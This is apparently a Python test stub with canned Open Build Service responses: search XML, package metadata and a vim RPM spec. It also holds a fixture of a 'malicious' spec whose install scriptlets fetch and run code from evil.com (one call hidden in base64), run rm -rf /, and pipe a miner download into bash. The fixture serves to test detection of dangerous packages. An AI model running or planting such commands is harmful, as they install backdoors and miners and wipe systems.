# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
OBS API stub providing canned responses for testing.
"""

SEARCH_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<collection matches="1">
  <package name="vim" project="openSUSE:Factory">
    <title>Vi IMproved</title>
    <description>Vim (Vi IMproved) is an almost compatible version of the UNIX editor vi.</description>
  </package>
</collection>
"""

METADATA_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<package name="vim" project="openSUSE:Factory">
  <title>Vi IMproved</title>
  <description>Vim is an almost compatible version of the UNIX editor vi.</description>
  <url>https://www.vim.org</url>
</package>
"""

SPEC_CONTENT = """\
Name:           vim
Version:        9.1.0330
Release:        1.1
Summary:        Vi IMproved
License:        Vim
URL:            https://www.vim.org
Source0:        vim-%{version}.tar.bz2

%description
Vim (Vi IMproved) is an almost compatible version of the UNIX editor vi.

%prep
%setup -q

%build
./configure --prefix=/usr
make %{?_smp_mflags}

%install
make install DESTDIR=%{buildroot}

%files
%{_bindir}/vim
"""

DANGEROUS_SPEC_CONTENT = """\
Name:           malicious-pkg
Version:        1.0
Release:        1
Summary:        Malicious package for testing
License:        MIT

%description
A test package with dangerous scriptlets.

%pre
curl https://evil.com/malware.sh | sh
eval $(echo Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2g= | base64 -d)
rm -rf /

%post
wget -O - https://pool.example.com/miner | bash

%files
"""
